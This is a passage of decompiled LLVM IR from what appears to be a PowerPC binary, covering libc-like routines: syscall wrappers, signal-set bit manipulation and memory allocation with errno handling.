  %v2_1000bfa8 = call i32 @function_1000d2a4(i32 2, i32 %v2_1000bf9c)
  ret i32 %v2_1000bfa8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000bfbc() local_unnamed_addr {
dec_label_pc_1000bfbc:
  %stack_var_-24 = alloca i32, align 4
  %v0_1000bfc4 = load i32, i32* @r3, align 4
  store i32 %v0_1000bfc4, i32* %stack_var_-24, align 4
  %v2_1000bfd0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484576, i32* @lr, align 4
  %v2_1000bfdc = call i32 @function_1000d2a4(i32 3, i32 %v2_1000bfd0)
  ret i32 %v2_1000bfdc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000bff0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bff0:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c004 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484628, i32* @lr, align 4
  %v2_1000c010 = call i32 @function_1000d2a4(i32 6, i32 %v2_1000c004)
  ret i32 %v2_1000c010

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000c024(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000c024:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c038 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484688, i32* @lr, align 4
  %v2_1000c04c = call i32 @function_1000d2a4(i32 15, i32 %v2_1000c038)
  ret i32 %v2_1000c04c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 15, { 0, 24, 5, 6, 12, 22, 23, 7, 8, 9, 10, 11, 13, 14, 15, 1, 16, 17, 2, 18, 19, 3, 20, 21, 4 }
}

define i32 @function_1000c060(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c060:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c074 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484736, i32* @lr, align 4
  %v2_1000c07c = call i32 @function_1000d2a4(i32 4, i32 %v2_1000c074)
  ret i32 %v2_1000c07c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000c090(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c090:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c0a4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484792, i32* @lr, align 4
  %v2_1000c0b4 = call i32 @function_1000d2a4(i32 10, i32 %v2_1000c0a4)
  ret i32 %v2_1000c0b4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000c0c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000c0c8:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c0dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484856, i32* @lr, align 4
  %v2_1000c0f4 = call i32 @function_1000d2a4(i32 12, i32 %v2_1000c0dc)
  ret i32 %v2_1000c0f4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000c108(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c108:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c11c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484912, i32* @lr, align 4
  %v2_1000c12c = call i32 @function_1000d2a4(i32 9, i32 %v2_1000c11c)
  ret i32 %v2_1000c12c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 9, { 2, 6, 7, 8, 38, 9, 10, 39, 40, 58, 59, 11, 3, 12, 0, 13, 14, 15, 41, 16, 17, 18, 19, 20, 42, 21, 4, 60, 43, 44, 45, 5, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 35, 36, 33, 34, 31, 32, 29, 30, 27, 28, 25, 26, 23, 24, 22, 37, 1, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
}

define i32 @function_1000c140(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000c140:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c154 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484976, i32* @lr, align 4
  %v2_1000c16c = call i32 @function_1000d2a4(i32 11, i32 %v2_1000c154)
  ret i32 %v2_1000c16c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000c180(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000c180:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c194 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268485036, i32* @lr, align 4
  %v2_1000c1a8 = call i32 @function_1000d2a4(i32 14, i32 %v2_1000c194)
  ret i32 %v2_1000c1a8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000c1bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c1bc:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c1d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268485088, i32* @lr, align 4
  %v2_1000c1dc = call i32 @function_1000d2a4(i32 1, i32 %v2_1000c1d0)
  ret i32 %v2_1000c1dc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000d2a4, { 5, 4, 8, 3, 7, 2, 11, 1, 6, 0, 10, 9 }
}

define i32 @function_1000c1f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c1f0:
  %v0_1000c1f0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268485128, i32* @lr, align 4
  %v0_1000c204 = call i32 @function_1000b480()
  %v0_1000c20c = load i32, i32* @r29, align 4
  store i32 %v0_1000c1f0, i32* @lr, align 4
  %v2_1000c21c = call i32 @function_1000b510(i32 %v0_1000c204, i32 %v0_1000c20c)
  ret i32 %v2_1000c21c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_1000b510, { 16, 10, 9, 15, 14, 13, 12, 11, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_1000b480, { 0, 1, 3, 2 }
}

define i32 @function_1000c220(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c220:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000c250, label %dec_label_pc_1000c23c

dec_label_pc_1000c23c:                            ; preds = %dec_label_pc_1000c220
  %v0_1000c23c = call i32 @function_1000bb0c()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c248 = inttoptr i32 %v0_1000c23c to i32*
  store i32 22, i32* %v2_1000c248, align 4
  %v0_1000c25c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c258

dec_label_pc_1000c250:                            ; preds = %dec_label_pc_1000c220
  %v0_1000c250 = call i32 @function_1000c3a0()
  store i32 %v0_1000c250, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c258

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c23c, %dec_label_pc_1000c250
  %v0_1000c25c = phi i32 [ %v0_1000c25c.pre, %dec_label_pc_1000c23c ], [ %v0_1000c250, %dec_label_pc_1000c250 ]
  ret i32 %v0_1000c25c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c258, { 1, 0 }
}

define i32 @function_1000c26c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c26c:
  store i32 268485252, i32* @lr, align 4
  %v3_1000c280 = call i32 @function_1000bc90(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @function_1000c298(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c298:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000c298 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c298, label %dec_label_pc_1000c2c4, label %dec_label_pc_1000c2b4

dec_label_pc_1000c2b4:                            ; preds = %dec_label_pc_1000c298
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000c2c4, label %dec_label_pc_1000c2bc

dec_label_pc_1000c2bc:                            ; preds = %dec_label_pc_1000c2b4
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000c2f4.lr.ph, label %dec_label_pc_1000c2c4

dec_label_pc_1000c2c4:                            ; preds = %dec_label_pc_1000c2bc, %dec_label_pc_1000c2b4, %dec_label_pc_1000c298
  %v0_1000c2c4 = call i32 @function_1000bb0c()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c2d0 = inttoptr i32 %v0_1000c2c4 to i32*
  store i32 22, i32* %v2_1000c2d0, align 4
  %v0_1000c364.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c2f4.lr.ph:                      ; preds = %dec_label_pc_1000c2bc
  %v2_1000c2e4 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000c2e4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000c2f422 = add i32 %v2_1000c2e4, 128
  %v3_1000c2f423 = inttoptr i32 %v2_1000c2f422 to i32*
  store i32 0, i32* %v3_1000c2f423, align 4
  %v0_1000c2f824 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c2f825 = add i32 %v0_1000c2f824, -1
  store i32 %v1_1000c2f825, i32* %r11.global-to-local, align 4
  %v1_1000c2fc26 = mul i32 %v1_1000c2f825, 4
  %v1_1000c30027 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000c30028 = add i32 %v1_1000c30027, %v1_1000c2fc26
  store i32 %v2_1000c30028, i32* %r9.global-to-local, align 4
  %v0_1000c30429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c30430 = add i32 %v0_1000c30429, -1
  store i32 %v1_1000c30430, i32* %ctr.global-to-local, align 4
  %v2_1000c30431 = icmp eq i32 %v1_1000c30430, 0
  br i1 %v2_1000c30431, label %dec_label_pc_1000c308, label %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge

dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge: ; preds = %dec_label_pc_1000c2f4.lr.ph, %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge
  %v2_1000c30032 = phi i32 [ %v2_1000c300, %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge ], [ %v2_1000c30028, %dec_label_pc_1000c2f4.lr.ph ]
  %v0_1000c2f4.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c2f4 = add i32 %v2_1000c30032, 4
  %v3_1000c2f4 = inttoptr i32 %v2_1000c2f4 to i32*
  store i32 %v0_1000c2f4.pre, i32* %v3_1000c2f4, align 4
  %v0_1000c2f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c2f8 = add i32 %v0_1000c2f8, -1
  store i32 %v1_1000c2f8, i32* %r11.global-to-local, align 4
  %v1_1000c2fc = mul i32 %v1_1000c2f8, 4
  %v1_1000c300 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000c300 = add i32 %v1_1000c300, %v1_1000c2fc
  store i32 %v2_1000c300, i32* %r9.global-to-local, align 4
  %v0_1000c304 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c304 = add i32 %v0_1000c304, -1
  store i32 %v1_1000c304, i32* %ctr.global-to-local, align 4
  %v2_1000c304 = icmp eq i32 %v1_1000c304, 0
  br i1 %v2_1000c304, label %dec_label_pc_1000c308, label %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge

dec_label_pc_1000c308:                            ; preds = %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge, %dec_label_pc_1000c2f4.lr.ph
  %v0_1000c30c.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c308 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000c308, i32* @r3, align 4
  store i32 %v0_1000c30c.pre, i32* @r4, align 4
  %v0_1000c310 = call i32 @function_1000c3a0()
  %v1_1000c314 = icmp slt i32 %v0_1000c310, 0
  br i1 %v1_1000c314, label %dec_label_pc_1000c35c, label %dec_label_pc_1000c31c

dec_label_pc_1000c31c:                            ; preds = %dec_label_pc_1000c308
  %v0_1000c320 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c328 = call i32 @function_1000c378(i32 ptrtoint (i32* @global_var_1001edbc.494 to i32), i32 %v0_1000c320)
  %v2_1000c334 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268485452, i32* @lr, align 4
  %v4_1000c348 = call i32 @function_1000da94(i32 %v0_1000c320, i32* nonnull %stack_var_-296, i32 %v2_1000c334)
  %v1_1000c34c = icmp slt i32 %v4_1000c348, 0
  br i1 %v1_1000c34c, label %dec_label_pc_1000c35c, label %dec_label_pc_1000c354

dec_label_pc_1000c354:                            ; preds = %dec_label_pc_1000c31c
  %v3_1000c354 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000c354, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c35c:                            ; preds = %dec_label_pc_1000c31c, %dec_label_pc_1000c308
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c360:                            ; preds = %dec_label_pc_1000c354, %dec_label_pc_1000c2c4, %dec_label_pc_1000c35c
  %v0_1000c364 = phi i32 [ %v3_1000c354, %dec_label_pc_1000c354 ], [ %v0_1000c364.pre, %dec_label_pc_1000c2c4 ], [ -1, %dec_label_pc_1000c35c ]
  ret i32 %v0_1000c364

; uselistorder directives
  uselistorder i32 %v1_1000c304, { 1, 0 }
  uselistorder i32 %v2_1000c300, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c360, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c2f4.dec_label_pc_1000c2f4_crit_edge, { 1, 0 }
}

define i32 @function_1000c378(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c378:
  %v1_1000c378 = add i32 %arg2, -1
  %v1_1000c37c = call i32 @__asm_rlwinm(i32 %v1_1000c378, i32 29, i32 3, i32 29)
  %v1_1000c380 = urem i32 %v1_1000c378, 32
  %v2_1000c384 = add i32 %v1_1000c37c, %arg1
  %v3_1000c384 = inttoptr i32 %v2_1000c384 to i32*
  %v4_1000c384 = load i32, i32* %v3_1000c384, align 4
  %v3_1000c38c = shl i32 1, %v1_1000c380
  %v2_1000c390 = and i32 %v4_1000c384, %v3_1000c38c
  %v2_1000c394 = icmp ne i32 %v2_1000c390, 0
  %v5_1000c398 = zext i1 %v2_1000c394 to i32
  ret i32 %v5_1000c398
}

define i32 @function_1000c3a0() local_unnamed_addr {
dec_label_pc_1000c3a0:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000c3a0 = load i32, i32* @r4, align 4
  %v1_1000c3a0 = add i32 %v0_1000c3a0, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000c3a8 = call i32 @__asm_rlwinm(i32 %v1_1000c3a0, i32 29, i32 3, i32 29)
  %v1_1000c3ac = urem i32 %v1_1000c3a0, 32
  %v1_1000c3b0 = load i32, i32* @r3, align 4
  %v2_1000c3b0 = add i32 %v1_1000c3b0, %v1_1000c3a8
  %v3_1000c3b0 = inttoptr i32 %v2_1000c3b0 to i32*
  %v4_1000c3b0 = load i32, i32* %v3_1000c3b0, align 4
  %v0_1000c3b4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c3b4 = shl i32 %v0_1000c3b4, %v1_1000c3ac
  store i32 %v3_1000c3b4, i32* %r0.global-to-local, align 4
  %v2_1000c3b8 = or i32 %v3_1000c3b4, %v4_1000c3b0
  store i32 %v2_1000c3b8, i32* %v3_1000c3b0, align 4
  ret i32 0
}

define i32 @function_1000c3c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c3c8:
  %v1_1000c3c8 = add i32 %arg2, -1
  %v1_1000c3d0 = call i32 @__asm_rlwinm(i32 %v1_1000c3c8, i32 29, i32 3, i32 29)
  %v1_1000c3d4 = urem i32 %v1_1000c3c8, 32
  %v2_1000c3d8 = add i32 %v1_1000c3d0, %arg1
  %v3_1000c3d8 = inttoptr i32 %v2_1000c3d8 to i32*
  %v4_1000c3d8 = load i32, i32* %v3_1000c3d8, align 4
  %v3_1000c3dc = shl i32 -2, %v1_1000c3d4
  %v4_1000c3dc = sub nsw i32 32, %v1_1000c3d4
  %v5_1000c3dc = lshr i32 -2, %v4_1000c3dc
  %v6_1000c3dc = or i32 %v5_1000c3dc, %v3_1000c3dc
  %v2_1000c3e0 = and i32 %v6_1000c3dc, %v4_1000c3d8
  store i32 %v2_1000c3e0, i32* %v3_1000c3d8, align 4
  ret i32 0
}

define i32 @function_1000c3f0() local_unnamed_addr {
dec_label_pc_1000c3f0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000c3f0 = load i32, i32* @r3, align 4
  %v3_1000c3f0 = icmp eq i32 %v0_1000c3f0, 0
  br i1 %v3_1000c3f0, label %dec_label_pc_1000c408, label %dec_label_pc_1000c40c

dec_label_pc_1000c408:                            ; preds = %dec_label_pc_1000c3f0
  br label %dec_label_pc_1000c40c

dec_label_pc_1000c40c:                            ; preds = %dec_label_pc_1000c3f0, %dec_label_pc_1000c408
  %v0_1000c41c = phi i32 [ 1, %dec_label_pc_1000c408 ], [ %v0_1000c3f0, %dec_label_pc_1000c3f0 ]
  %v3_1000c410 = icmp ugt i32 %v0_1000c41c, -8
  br i1 %v3_1000c410, label %dec_label_pc_1000c520, label %dec_label_pc_1000c418

dec_label_pc_1000c418:                            ; preds = %dec_label_pc_1000c40c
  %v1_1000c41c = add i32 %v0_1000c41c, 4
  store i32 ptrtoint (i32* @global_var_1001ebf4.495 to i32), i32* @r29, align 4
  store i32 %v1_1000c41c, i32* %stack_var_-40, align 4
  %v0_1000c42c = call i32 @function_1000cf4c()
  %v2_1000c434 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000c43c = call i32 @function_1000c7e8(i32* inttoptr (i32 268561152 to i32*), i32 %v2_1000c434)
  store i32 %v3_1000c43c, i32* %r31.global-to-local, align 4
  %v0_1000c448 = call i32 @function_1000cf4c()
  %v3_1000c44c = icmp eq i32 %v3_1000c43c, 0
  br i1 %v3_1000c44c, label %dec_label_pc_1000c454, label %dec_label_pc_1000c504.thread

dec_label_pc_1000c504.thread:                     ; preds = %dec_label_pc_1000c418
  br label %dec_label_pc_1000c518

dec_label_pc_1000c454:                            ; preds = %dec_label_pc_1000c418
  %v3_1000c458 = load i32, i32* @global_var_1001eb58.498, align 4
  store i32 %v3_1000c458, i32* %r31.global-to-local, align 4
  %v3_1000c45c = load i32, i32* %stack_var_-40, align 4
  %v2_1000c460 = icmp ult i32 %v3_1000c45c, %v3_1000c458
  br i1 %v2_1000c460, label %dec_label_pc_1000c478, label %dec_label_pc_1000c468

dec_label_pc_1000c468:                            ; preds = %dec_label_pc_1000c454
  %v1_1000c46c = sub i32 0, %v3_1000c458
  %v2_1000c468 = add i32 %v3_1000c458, -1
  %v1_1000c470 = add i32 %v2_1000c468, %v3_1000c45c
  %v2_1000c474 = and i32 %v1_1000c470, %v1_1000c46c
  store i32 %v2_1000c474, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c478

dec_label_pc_1000c478:                            ; preds = %dec_label_pc_1000c454, %dec_label_pc_1000c468
  %v0_1000c484 = call i32 @function_1000cf4c()
  %v0_1000c488 = load i32, i32* %r31.global-to-local, align 4
  store i32 268485776, i32* @lr, align 4
  %v1_1000c48c = call i32 @function_1000d76c(i32 %v0_1000c488)
  %v3_1000c490 = icmp eq i32 %v1_1000c48c, -1
  br i1 %v3_1000c490, label %dec_label_pc_1000c4b0, label %dec_label_pc_1000c498

dec_label_pc_1000c498:                            ; preds = %dec_label_pc_1000c478
  %v1_1000c498 = add i32 %v1_1000c48c, 3
  %v1_1000c49c = call i32 @__asm_rlwinm(i32 %v1_1000c498, i32 0, i32 0, i32 29)
  store i32 %v1_1000c49c, i32* @r30, align 4
  %v4_1000c4a0 = icmp eq i32 %v1_1000c49c, %v1_1000c48c
  br i1 %v4_1000c4a0, label %dec_label_pc_1000c4b0, label %dec_label_pc_1000c4a8

dec_label_pc_1000c4a8:                            ; preds = %dec_label_pc_1000c498
  %v2_1000c4a8 = sub i32 %v1_1000c49c, %v1_1000c48c
  store i32 268485808, i32* @lr, align 4
  %v1_1000c4ac = call i32 @function_1000d76c(i32 %v2_1000c4a8)
  br label %dec_label_pc_1000c4b0

dec_label_pc_1000c4b0:                            ; preds = %dec_label_pc_1000c498, %dec_label_pc_1000c478, %dec_label_pc_1000c4a8
  %v0_1000c4b8 = call i32 @function_1000cf4c()
  %v0_1000c4bc = load i32, i32* @r30, align 4
  %v3_1000c4bc = icmp eq i32 %v0_1000c4bc, -1
  br i1 %v3_1000c4bc, label %dec_label_pc_1000c520, label %dec_label_pc_1000c504

dec_label_pc_1000c504:                            ; preds = %dec_label_pc_1000c4b0
  store i32 ptrtoint (i32* @global_var_1001ebf4.495 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001eb00 to i32), i32* @r29, align 4
  %v0_1000c4d8 = call i32 @function_1000cf4c()
  %v0_1000c4dc = load i32, i32* @r31, align 4
  %v0_1000c4e0 = load i32, i32* @r30, align 4
  %v0_1000c4e4 = load i32, i32* @r29, align 4
  store i32 268485868, i32* @lr, align 4
  %v3_1000c4e8 = inttoptr i32 %v0_1000c4e4 to i32*
  %v4_1000c4e8 = call i32 @function_1000c96c(i32* %v3_1000c4e8, i32 %v0_1000c4e0, i32 %v0_1000c4dc)
  %v0_1000c4ec = load i32, i32* @r29, align 4
  %v2_1000c4f4 = inttoptr i32 %v0_1000c4ec to i32*
  %v3_1000c4f4 = call i32 @function_1000c7e8(i32* %v2_1000c4f4, i32 %v2_1000c434)
  store i32 %v3_1000c4f4, i32* %r31.global-to-local, align 4
  %v0_1000c500 = call i32 @function_1000cf4c()
  %v3_1000c504 = icmp eq i32 %v3_1000c4f4, 0
  br i1 %v3_1000c504, label %dec_label_pc_1000c518.thread, label %dec_label_pc_1000c518

dec_label_pc_1000c518.thread:                     ; preds = %dec_label_pc_1000c504
  br label %dec_label_pc_1000c520

dec_label_pc_1000c518:                            ; preds = %dec_label_pc_1000c504, %dec_label_pc_1000c504.thread
  %v0_1000c518.pr6 = phi i32 [ %v3_1000c43c, %dec_label_pc_1000c504.thread ], [ %v3_1000c4f4, %dec_label_pc_1000c504 ]
  %v3_1000c50c = load i32, i32* %stack_var_-40, align 4
  %v2_1000c510 = inttoptr i32 %v0_1000c518.pr6 to i32*
  store i32 %v3_1000c50c, i32* %v2_1000c510, align 4
  %v0_1000c514 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000c514 = add i32 %v0_1000c514, 4
  store i32 %v1_1000c514, i32* @r31, align 4
  %v3_1000c518 = icmp eq i32 %v1_1000c514, 0
  br i1 %v3_1000c518, label %dec_label_pc_1000c520, label %dec_label_pc_1000c530

dec_label_pc_1000c520:                            ; preds = %dec_label_pc_1000c518.thread, %dec_label_pc_1000c518, %dec_label_pc_1000c4b0, %dec_label_pc_1000c40c
  %v0_1000c520 = call i32 @function_1000bb0c()
  %v2_1000c528 = inttoptr i32 %v0_1000c520 to i32*
  store i32 12, i32* %v2_1000c528, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000c530

dec_label_pc_1000c530:                            ; preds = %dec_label_pc_1000c518, %dec_label_pc_1000c520
  %v0_1000c534 = phi i32 [ %v1_1000c514, %dec_label_pc_1000c518 ], [ 0, %dec_label_pc_1000c520 ]
  ret i32 %v0_1000c534

; uselistorder directives
  uselistorder i32 %v1_1000c514, { 1, 0, 2 }
  uselistorder i32 %v1_1000c49c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c48c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000c458, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000c43c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000c530, { 1, 0 }
  uselistorder label %dec_label_pc_1000c520, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c4b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c478, { 1, 0 }
  uselistorder label %dec_label_pc_1000c40c, { 1, 0 }
}

define i32 @function_1000c548(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c548:
  %v3_1000c548 = icmp eq i32 %arg1, 0
  %v2_1000c558 = mul i32 %arg2, %arg1
  store i32 %v2_1000c558, i32* @r31, align 4
  br i1 %v3_1000c548, label %dec_label_pc_1000c584, label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c548
  %v2_1000c564 = udiv i32 %v2_1000c558, %arg1
  store i32 0, i32* @r30, align 4
  %v4_1000c56c = icmp eq i32 %v2_1000c564, %arg2
  br i1 %v4_1000c56c, label %dec_label_pc_1000c584, label %dec_label_pc_1000c574

dec_label_pc_1000c574:                            ; preds = %dec_label_pc_1000c564
  %v0_1000c574 = call i32 @function_1000bb0c()
  %v2_1000c57c = inttoptr i32 %v0_1000c574 to i32*
  store i32 12, i32* %v2_1000c57c, align 4
  br label %dec_label_pc_1000c5a0

dec_label_pc_1000c584:                            ; preds = %dec_label_pc_1000c564, %dec_label_pc_1000c548
  store i32 %v2_1000c558, i32* @r3, align 4
  store i32 268486028, i32* @lr, align 4
  %v0_1000c588 = call i32 @function_1000c3f0()
  %v0_1000c58c = load i32, i32* @r31, align 4
  store i32 %v0_1000c588, i32* @r30, align 4
  %v3_1000c590 = icmp eq i32 %v0_1000c588, 0
  br i1 %v3_1000c590, label %dec_label_pc_1000c5a0, label %dec_label_pc_1000c59c

dec_label_pc_1000c59c:                            ; preds = %dec_label_pc_1000c584
  store i32 268486048, i32* @lr, align 4
  %v3_1000c59c = call i32 @function_1000bc90(i32 0, i32 %v0_1000c58c, i32 %v0_1000c58c)
  br label %dec_label_pc_1000c5a0

dec_label_pc_1000c5a0:                            ; preds = %dec_label_pc_1000c584, %dec_label_pc_1000c574, %dec_label_pc_1000c59c
  %v0_1000c5a4 = load i32, i32* @r30, align 4
  ret i32 %v0_1000c5a4

; uselistorder directives
  uselistorder i32 %v0_1000c58c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c5a0, { 2, 0, 1 }
}

define i32 @function_1000c5b8() local_unnamed_addr {
dec_label_pc_1000c5b8:
  %v0_1000c5b8 = load i32, i32* @r3, align 4
  %v3_1000c5b8 = icmp eq i32 %v0_1000c5b8, 0
  br i1 %v3_1000c5b8, label %dec_label_pc_1000c6a4, label %dec_label_pc_1000c5d0

dec_label_pc_1000c5d0:                            ; preds = %dec_label_pc_1000c5b8
  %v1_1000c5d4 = add i32 %v0_1000c5b8, -4
  %v2_1000c5d4 = inttoptr i32 %v1_1000c5d4 to i32*
  %v3_1000c5d4 = load i32, i32* %v2_1000c5d4, align 4
  store i32 %v3_1000c5d4, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_1000c5e8 = call i32 @function_1000cf4c()
  %v0_1000c5f0 = load i32, i32* @r28, align 4
  store i32 268486140, i32* @lr, align 4
  %v4_1000c5f8 = call i32 @function_1000c96c(i32* nonnull @global_var_1001eb00, i32 %v1_1000c5d4, i32 %v0_1000c5f0)
